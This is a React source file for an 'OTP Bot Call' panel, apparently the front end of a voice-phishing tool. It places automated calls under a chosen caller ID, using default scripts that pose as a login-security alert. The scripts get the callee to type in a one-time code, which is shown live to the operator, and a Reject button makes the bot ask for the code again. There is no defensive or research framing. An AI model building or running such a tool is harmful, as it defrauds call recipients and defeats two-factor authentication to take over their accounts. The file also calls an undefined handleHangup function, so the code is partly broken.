import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Textarea } from '../components/ui/textarea';
import { Badge } from '../components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
import { ScrollArea } from '../components/ui/scroll-area';
import { 
    Phone, 
    PhoneCall,
    PhoneOff,
    CheckCircle2,
    XCircle,
    Play,
    Copy,
    Download,
    Settings,
    Terminal,
    User,
    Shield,
    Hash,
    Volume2,
    RefreshCw
} from 'lucide-react';
import { toast } from 'sonner';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const VOICE_MODELS = [
    { value: 'en-US-JennyNeural', label: 'Jenny (US English)' },
    { value: 'en-US-GuyNeural', label: 'Guy (US English)' },
    { value: 'en-GB-SoniaNeural', label: 'Sonia (UK English)' },
    { value: 'en-AU-NatashaNeural', label: 'Natasha (Australian)' },
];

const CALL_TYPES = [
    { value: 'password_change', label: 'Password Change Alert' },
    { value: 'login_verification', label: 'Login Verification' },
    { value: 'account_security', label: 'Account Security' },
    { value: 'transaction_alert', label: 'Transaction Alert' },
];

const OTPBotPage = () => {
    const [socket, setSocket] = useState(null);
    const [logs, setLogs] = useState([]);
    const [sessionId, setSessionId] = useState(null);
    const [sessionStatus, setSessionStatus] = useState(null);
    const [otpReceived, setOtpReceived] = useState(null);
    const [isCallActive, setIsCallActive] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const logsEndRef = useRef(null);

    // Form state
    const [config, setConfig] = useState({
        recipient_number: '',
        caller_id: '',
        recipient_name: '',
        service_name: 'Account',
        otp_digits: 6,
        language: 'en',
        voice_model: 'en-US-JennyNeural',
        step1_message: 'Hello {name}, we have detected a login attempt to your {service} account from a new device. If you did not recognize this request, please press 1. If this was you, press 0.',
        step2_message: 'Alright, we just sent a {digits} digit verification code to your number. Could you please enter it using your dial pad?',
        step3_message: 'Okay, please wait a moment while we verify the code.',
        accepted_message: 'Okay! We have declined the sign-in request, and your account is safe. Thank you for your time. Have a nice day!',
        rejected_message: 'I am sorry, but the code you entered is incorrect. Could you please enter it again? It should be {digits} digits.'
    });

    const [activeStep, setActiveStep] = useState('step1');

    // Scroll to bottom on new logs
    useEffect(() => {
        logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [logs]);

    // Connect to Socket.IO when session starts
    useEffect(() => {
        if (sessionId && !socket) {
            const newSocket = io(BACKEND_URL, {
                transports: ['websocket', 'polling'],
            });

            newSocket.on('connect', () => {
                console.log('Socket connected');
                newSocket.emit('join_session', { session_id: sessionId });
            });

            newSocket.on('call_log', (log) => {
                console.log('Log received:', log);
                setLogs(prev => [...prev, log]);
                
                // Update session status based on log
                if (log.type === 'otp' && log.data?.otp) {
                    setOtpReceived(log.data.otp);
                }
                if (log.type === 'success' && log.message.includes('completed')) {
                    setIsCallActive(false);
                }
            });

            newSocket.on('disconnect', () => {
                console.log('Socket disconnected');
            });

            setSocket(newSocket);

            return () => {
                newSocket.close();
            };
        }
    }, [sessionId]);

    const getAuthHeaders = () => {
        const token = localStorage.getItem('token');
        return token ? { Authorization: `Bearer ${token}` } : {};
    };

    const handleInitiateCall = async () => {
        if (!config.recipient_number || !config.caller_id) {
            toast.error('Harap isi nomor penerima dan Caller ID');
            return;
        }

        setIsLoading(true);
        setLogs([]);
        setOtpReceived(null);

        try {
            const response = await axios.post(`${API}/otp/initiate-call`, config, {
                headers: getAuthHeaders()
            });

            setSessionId(response.data.session_id);
            setIsCallActive(true);
            toast.success('Call initiated!');
        } catch (error) {
            console.error('Error initiating call:', error);
            toast.error(error.response?.data?.detail || 'Failed to initiate call');
        } finally {
            setIsLoading(false);
        }
    };

    const handleAccept = async () => {
        if (!sessionId) return;

        try {
            await axios.post(`${API}/otp/accept/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.success('OTP Accepted!');
            setIsCallActive(false);
        } catch (error) {
            toast.error('Failed to accept');
        }
    };

    const handleReject = async () => {
        if (!sessionId) return;

        try {
            await axios.post(`${API}/otp/reject/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info('OTP Rejected - Waiting for retry');
            setOtpReceived(null);
        } catch (error) {
            toast.error('Failed to reject');
        }
    };

    const copyLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.message}`).join('\n');
        navigator.clipboard.writeText(logText);
        toast.success('Logs copied!');
    };

    const exportLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.type.toUpperCase()}: ${l.message}`).join('\n');
        const blob = new Blob([logText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `call_log_${sessionId || 'session'}.txt`;
        a.click();
    };

    const getLogIcon = (type) => {
        switch (type) {
            case 'success': return '✅';
            case 'error': return '❌';
            case 'dtmf': return '🔢';
            case 'otp': return '🕵️';
            case 'call': return '📞';
            case 'step': return '🎙️';
            case 'action': return '⚡';
            default: return 'ℹ️';
        }
    };

    const getLogColor = (type) => {
        switch (type) {
            case 'success': return 'text-emerald-400';
            case 'error': return 'text-red-400';
            case 'dtmf': return 'text-cyan-400';
            case 'otp': return 'text-amber-400';
            case 'action': return 'text-violet-400';
            default: return 'text-gray-300';
        }
    };

    return (
        <div className="space-y-6" data-testid="otp-bot-page">
            {/* Header */}
            <div className="flex items-center justify-between">
                <div>
                    <h1 className="text-2xl md:text-3xl font-black tracking-tight flex items-center gap-3">
                        <PhoneCall className="w-8 h-8 text-violet-400" />
                        <span>OTP <span className="text-gradient">Bot Call</span></span>
                    </h1>
                    <p className="text-gray-400 mt-1">Advanced Voice OTP Collection System</p>
                </div>
                <Badge className={`${isCallActive ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-gray-500/20 text-gray-400'}`}>
                    {isCallActive ? '● Active Call' : '○ No Active Call'}
                </Badge>
            </div>

            <div className="grid lg:grid-cols-2 gap-6">
                {/* Left Column - Configuration */}
                <div className="space-y-6">
                    {/* Call Configuration Card */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-4">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Settings className="w-5 h-5 text-violet-400" />
                                Call Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Call Type</Label>
                                    <Select defaultValue="password_change">
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10">
                                            {CALL_TYPES.map(type => (
                                                <SelectItem key={type.value} value={type.value}>{type.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Voice Model</Label>
                                    <Select 
                                        value={config.voice_model}
                                        onValueChange={(v) => setConfig({...config, voice_model: v})}
                                    >
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10">
                                            {VOICE_MODELS.map(model => (
                                                <SelectItem key={model.value} value={model.value}>{model.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Caller ID / From Number
                                    </Label>
                                    <Input
                                        data-testid="otp-caller-id"
                                        value={config.caller_id}
                                        onChange={(e) => setConfig({...config, caller_id: e.target.value})}
                                        placeholder="+12025551234"
                                        className="bg-[#0F111A] border-amber-500/30 font-mono"
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <User className="w-3 h-3" />
                                        Recipient Name
                                    </Label>
                                    <Input
                                        value={config.recipient_name}
                                        onChange={(e) => setConfig({...config, recipient_name: e.target.value})}
                                        placeholder="John"
                                        className="bg-[#0F111A] border-white/10"
                                    />
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Recipient Number
                                    </Label>
                                    <Input
                                        data-testid="otp-recipient-number"
                                        value={config.recipient_number}
                                        onChange={(e) => setConfig({...config, recipient_number: e.target.value})}
                                        placeholder="+13362873517"
                                        className="bg-[#0F111A] border-white/10 font-mono"
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Shield className="w-3 h-3" />
                                        Service Name
                                    </Label>
                                    <Input
                                        value={config.service_name}
                                        onChange={(e) => setConfig({...config, service_name: e.target.value})}
                                        placeholder="Account"
                                        className="bg-[#0F111A] border-white/10"
                                    />
                                </div>
                            </div>

                            <div className="space-y-2">
                                <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                    <Hash className="w-3 h-3" />
                                    OTP Digits
                                </Label>
                                <Select 
                                    value={config.otp_digits.toString()}
                                    onValueChange={(v) => setConfig({...config, otp_digits: parseInt(v)})}
                                >
                                    <SelectTrigger className="bg-[#0F111A] border-white/10 w-32">
                                        <SelectValue />
                                    </SelectTrigger>
                                    <SelectContent className="bg-[#12141F] border-white/10">
                                        <SelectItem value="4">4 digits</SelectItem>
                                        <SelectItem value="5">5 digits</SelectItem>
                                        <SelectItem value="6">6 digits</SelectItem>
                                        <SelectItem value="8">8 digits</SelectItem>
                                    </SelectContent>
                                </Select>
                            </div>
                        </CardContent>
                    </Card>

                    {/* Call Steps Configuration */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Volume2 className="w-5 h-5 text-cyan-400" />
                                Call Steps Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent>
                            <Tabs value={activeStep} onValueChange={setActiveStep}>
                                <TabsList className="grid grid-cols-5 bg-[#0F111A] mb-4">
                                    <TabsTrigger value="step1" className="text-xs data-[state=active]:bg-blue-600">Step 1</TabsTrigger>
                                    <TabsTrigger value="step2" className="text-xs data-[state=active]:bg-blue-600">Step 2</TabsTrigger>
                                    <TabsTrigger value="step3" className="text-xs data-[state=active]:bg-blue-600">Step 3</TabsTrigger>
                                    <TabsTrigger value="accepted" className="text-xs data-[state=active]:bg-emerald-600">Accepted</TabsTrigger>
                                    <TabsTrigger value="rejected" className="text-xs data-[state=active]:bg-red-600">Rejected</TabsTrigger>
                                </TabsList>

                                <TabsContent value="step1" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 1 - Greeting & Verification</p>
                                    <Textarea
                                        value={config.step1_message}
                                        onChange={(e) => setConfig({...config, step1_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
                                        placeholder="Hello {name}, we have detected..."
                                    />
                                </TabsContent>

                                <TabsContent value="step2" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 2 - OTP Request</p>
                                    <Textarea
                                        value={config.step2_message}
                                        onChange={(e) => setConfig({...config, step2_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="step3" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 3 - Verification Wait</p>
                                    <Textarea
                                        value={config.step3_message}
                                        onChange={(e) => setConfig({...config, step3_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="accepted" className="space-y-2">
                                    <p className="text-xs text-emerald-400">Accepted Message</p>
                                    <Textarea
                                        value={config.accepted_message}
                                        onChange={(e) => setConfig({...config, accepted_message: e.target.value})}
                                        className="bg-[#0F111A] border-emerald-500/30 min-h-[100px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="rejected" className="space-y-2">
                                    <p className="text-xs text-red-400">Rejected Message</p>
                                    <Textarea
                                        value={config.rejected_message}
                                        onChange={(e) => setConfig({...config, rejected_message: e.target.value})}
                                        className="bg-[#0F111A] border-red-500/30 min-h-[100px] text-sm"
                                    />
                                </TabsContent>
                            </Tabs>

                            {/* Action Buttons */}
                            <div className="flex gap-3 mt-6">
                                <Button
                                    onClick={handleInitiateCall}
                                    disabled={isLoading || isCallActive}
                                    data-testid="initiate-call-btn"
                                    className="flex-1 bg-violet-600 hover:bg-violet-700 glow-primary"
                                >
                                    {isLoading ? (
                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-2" />
                                    ) : (
                                        <Play className="w-4 h-4 mr-2" />
                                    )}
                                    {isCallActive ? 'Call in Progress' : 'Initiate Call'}
                                </Button>
                                {isCallActive && (
                                    <Button
                                        onClick={handleHangup}
                                        variant="destructive"
                                        data-testid="hangup-btn"
                                        className="bg-red-600 hover:bg-red-700"
                                    >
                                        <PhoneOff className="w-4 h-4 mr-2" />
                                        Hangup
                                    </Button>
                                )}
                            </div>
                        </CardContent>
                    </Card>
                </div>

                {/* Right Column - Live Status & Logs */}
                <div className="space-y-6">
                    {/* Current Call Status */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-4">
                            <CardTitle className="text-lg">Current Call Status</CardTitle>
                        </CardHeader>
                        <CardContent>
                            {!isCallActive && !otpReceived ? (
                                <div className="flex flex-col items-center justify-center py-8 text-gray-500">
                                    <PhoneCall className="w-16 h-16 opacity-30 mb-4" />
                                    <p>No active call</p>
                                </div>
                            ) : otpReceived ? (
                                <div className="space-y-4">
                                    <div className="text-center p-6 rounded-lg bg-amber-500/10 border border-amber-500/30">
                                        <p className="text-sm text-amber-400 mb-2">OTP Received</p>
                                        <p className="text-4xl font-mono font-bold text-white tracking-widest">
                                            {otpReceived}
                                        </p>
                                    </div>
                                    <div className="flex gap-3">
                                        <Button
                                            onClick={handleAccept}
                                            data-testid="accept-otp-btn"
                                            className="flex-1 bg-emerald-600 hover:bg-emerald-700"
                                        >
                                            <CheckCircle2 className="w-4 h-4 mr-2" />
                                            Accept
                                        </Button>
                                        <Button
                                            onClick={handleReject}
                                            data-testid="reject-otp-btn"
                                            variant="destructive"
                                            className="flex-1"
                                        >
                                            <XCircle className="w-4 h-4 mr-2" />
                                            Reject
                                        </Button>
                                    </div>
                                </div>
                            ) : (
                                <div className="flex items-center justify-center py-8">
                                    <div className="animate-pulse-glow w-16 h-16 rounded-full bg-violet-600/30 flex items-center justify-center">
                                        <Phone className="w-8 h-8 text-violet-400" />
                                    </div>
                                </div>
                            )}
                        </CardContent>
                    </Card>

                    {/* Live Call Log */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2 flex flex-row items-center justify-between">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Terminal className="w-5 h-5 text-emerald-400" />
                                Live Call Log
                            </CardTitle>
                            <div className="flex gap-2">
                                <Button variant="ghost" size="sm" onClick={copyLogs} className="text-gray-400 hover:text-white">
                                    <Copy className="w-4 h-4" />
                                </Button>
                                <Button variant="ghost" size="sm" onClick={exportLogs} className="text-gray-400 hover:text-white">
                                    <Download className="w-4 h-4" />
                                </Button>
                            </div>
                        </CardHeader>
                        <CardContent>
                            <ScrollArea className="h-[400px] pr-4">
                                <div className="space-y-2 font-mono text-sm">
                                    {logs.length === 0 ? (
                                        <p className="text-gray-500 text-center py-8">Waiting for call activity...</p>
                                    ) : (
                                        logs.map((log, index) => (
                                            <div 
                                                key={index} 
                                                className={`flex gap-2 ${getLogColor(log.type)}`}
                                            >
                                                <span className="text-gray-500">[{log.timestamp}]</span>
                                                <span>{getLogIcon(log.type)}</span>
                                                <span>{log.message}</span>
                                            </div>
                                        ))
                                    )}
                                    <div ref={logsEndRef} />
                                </div>
                            </ScrollArea>
                            {sessionId && (
                                <p className="text-xs text-gray-500 mt-4 font-mono">
                                    Session: {sessionId}
                                </p>
                            )}
                        </CardContent>
                    </Card>
                </div>
            </div>
        </div>
    );
};

export default OTPBotPage;
